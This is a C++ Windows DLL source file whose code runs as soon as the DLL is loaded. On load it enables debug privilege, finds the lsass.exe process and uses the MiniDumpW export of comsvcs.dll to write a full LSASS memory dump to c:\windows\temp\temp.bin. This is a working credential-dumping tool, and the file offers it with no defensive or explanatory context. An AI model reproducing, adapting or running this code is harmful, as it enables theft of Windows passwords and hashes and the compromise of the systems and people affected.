#include "pch.h"
#include <cstdio>
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <stdio.h>

#pragma comment(lib,"Dbghelp.lib")

typedef HRESULT(WINAPI* _MiniDumpW)(
    DWORD arg1, DWORD arg2, PWCHAR cmdline);


typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
    ULONG Privilege, BOOL Enable,
    BOOL CurrentThread, PULONG Enabled);


char* WcharToChar(wchar_t* wc)
{
    char* m_char;
    int len = WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), NULL, 0, NULL, NULL);
    m_char = new char[len + 1];
    WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), m_char, len, NULL, NULL);
    m_char[len] = '\0';
    return m_char;
}


DWORD ID(const char* pName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) {
        return NULL;
    }
    PROCESSENTRY32 pe = { sizeof(pe) };
    for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
        if (strcmp(WcharToChar(pe.szExeFile), pName) == 0) {
            CloseHandle(hSnapshot);
            return pe.th32ProcessID;
        }
    }
    CloseHandle(hSnapshot);
    return 0;
}
int dump() {


    HRESULT             hr;
    _MiniDumpW          MiniDumpW;
    _RtlAdjustPrivilege RtlAdjustPrivilege;
    ULONG               t;
    MiniDumpW = (_MiniDumpW)GetProcAddress(
        LoadLibrary(L"comsvcs.dll"), "MiniDumpW");


    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
        GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");


    if (MiniDumpW == NULL) {


        return 0;
    }
    // try enable debug privilege
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);


    wchar_t  ws[100];
    DWORD pid = ID("lsass.exe");
    swprintf(ws, 100, L"%u %hs", pid, "c:\\windows\\temp\\temp.bin full"); 


    MiniDumpW(0, 0, ws);


    return 0;


}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        dump();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}